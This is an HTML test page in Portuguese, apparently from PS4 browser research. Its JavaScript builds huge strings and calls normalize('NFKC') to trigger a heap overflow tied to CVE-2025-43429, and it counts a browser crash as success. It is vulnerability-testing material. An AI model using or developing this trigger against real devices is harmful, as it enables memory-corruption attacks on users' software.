<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 ICU Normalize CVE-2025-43429 Tests</title>
    <style>
        body { font-family: sans-serif; padding: 20px; background-color: #f0f0f0; }
        h1 { font-size: 1.2em; }
        button { 
            margin: 10px 5px; 
            padding: 15px 20px; 
            font-size: 16px; 
            cursor: pointer; 
            background-color: #007bff; 
            color: white; 
            border: none; 
            border-radius: 5px;
        }
        button:hover { background-color: #0056b3; }
        #log { 
            height: 400px; 
            border: 1px solid #999; 
            overflow-y: scroll; 
            padding: 10px; 
            background: #fff; 
            font-family: monospace;
            margin-top: 20px;
            white-space: pre-wrap;
        }
        .error { color: red; font-weight: bold; }
        .info { color: blue; }
        .success { color: green; font-weight: bold; }
    </style>
</head>
<body>
    <h1>CVE-2025-43429 (ICU Heap Overflow) - Variações Anti-OOM</h1>
    
    <div id="controls">
        <button onclick="clearLog()">Limpar Log</button>
        <br><br>
        <button onclick="test218a_LowMemory()">Test 218a: Low Memory (Factor 0.15)</button>
        <button onclick="test218b_MediumMemory()">Test 218b: Medium Memory (Factor 0.35)</button>
        <button onclick="test218c_RopeAttack()">Test 218c: Rope Attack (Chunked)</button>
    </div>

    <div id="log"></div>

    <script>
        const log = document.getElementById('log');
        let crashes = 0;

        function addLog(msg, isError = false) {
            const div = document.createElement('div');
            const time = new Date().toLocaleTimeString();
            div.textContent = `[${time}] ${msg}`;
            if (isError) div.className = 'error';
            log.appendChild(div);
            console.log(msg);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            log.innerHTML = '';
            addLog('Log limpo.');
        }

        // ==========================================
        // VARIAÇÃO A: Baixa pressão de memória
        // ==========================================
        function test218a_LowMemory() {
            addLog('=== INICIANDO TESTE 218a (Low Memory) ===');
            addLog('Objetivo: Testar integer overflow sem estourar RAM física.');
            try {
                // Configuração alvo
                let len = 0x7FFFFFF0; // Limite 32-bit alvo
                let numExpandChars = 16;
                let fillLen = len - numExpandChars;
                
                let expandChar = "\u00A8";
                let fillChar = "a";
                
                // Fator reduzido para 0.15 (~300MB alocados)
                let compatFactor = 0.15; 
                
                addLog(`Alocando string (Fator: ${compatFactor})...`);
                
                // Criação direta
                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
                
                addLog(`String criada. Comprimento: ${largeStr.length}. Executando normalize('NFKC')...`);
                addLog('ATENÇÃO: O navegador pode travar por alguns segundos.');
                
                // O crash deve ocorrer aqui se vulnerável
                let normalized = largeStr.normalize('NFKC');
                
                addLog('Normalização concluída com sucesso (Sem Crash).', false);
                addLog('Resultado: Provavelmente não vulnerável com este fator ou RAM insuficiente para trigger.', false);
            } catch(e) {
                addLog('Exceção capturada: ' + e.message, true);
                if (e.message.includes("Out of memory")) {
                    addLog('Falha: OOM (Sem memória) antes do overflow.', true);
                }
                crashes++;
            }
        }

        // ==========================================
        // VARIAÇÃO B: Média pressão de memória
        // ==========================================
        function test218b_MediumMemory() {
            addLog('=== INICIANDO TESTE 218b (Medium Memory) ===');
            try {
                let len = 0x7FFFFFF0;
                let numExpandChars = 16;
                let fillLen = len - numExpandChars;
                let expandChar = "\u00A8";
                let fillChar = "a";
                
                // Fator ajustado para 0.35 (~700MB alocados)
                let compatFactor = 0.35; 
                
                addLog(`Alocando string (Fator: ${compatFactor})...`);
                let largeStr = expandChar.repeat(numExpandChars) + fillChar.repeat(Math.ceil(fillLen * compatFactor));
                
                addLog(`String criada. Comprimento: ${largeStr.length}. Executando normalize...`);
                
                let normalized = largeStr.normalize('NFKC');
                
                addLog('Normalização concluída com sucesso (Sem Crash).');
            } catch(e) {
                addLog('Exceção capturada: ' + e.message, true);
                crashes++;
            }
        }

        // ==========================================
        // VARIAÇÃO C: Rope Attack (Chunked)
        // ==========================================
        function test218c_RopeAttack() {
            addLog('=== INICIANDO TESTE 218c (Rope Attack) ===');
            addLog('Estratégia: Construção em chunks para evitar alocação contígua imediata.');
            try {
                let len = 0x7FFFFFF0;
                let compatFactor = 0.5; // Tenta fator alto (0.5)
                let totalSize = Math.ceil(len * compatFactor);
                let chunkSize = 1024 * 1024 * 10; // Chunks de 10MB
                
                addLog(`Alvo total: ~${Math.round(totalSize/1024/1024)} MB em chunks de 10MB.`);
                
                let parts = ["\u00A8".repeat(16)];
                let currentLen = 0;
                
                // Construção lazy (array de strings)
                while(currentLen < totalSize) {
                    parts.push("a".repeat(Math.min(chunkSize, totalSize - currentLen)));
                    currentLen += chunkSize;
                }
                
                addLog(`Chunks criados: ${parts.length}. Unindo (Flattening)...`);
                
                // A união força a alocação real
                let largeStr = parts.join(''); 
                
                addLog('String unida. Disparando normalize...');
                let normalized = largeStr.normalize('NFKC');
                
                addLog('Normalização concluída com sucesso (Sem Crash).');
            } catch(e) {
                addLog('Exceção capturada: ' + e.message, true);
                crashes++;
            }
        }

        // Inicialização
        addLog('Suite CVE-2025-43429 carregada.');
        addLog('Selecione um teste acima. Se o navegador fechar abruptamente, o teste foi SUCESSO.');
    </script>
</body>
</html>
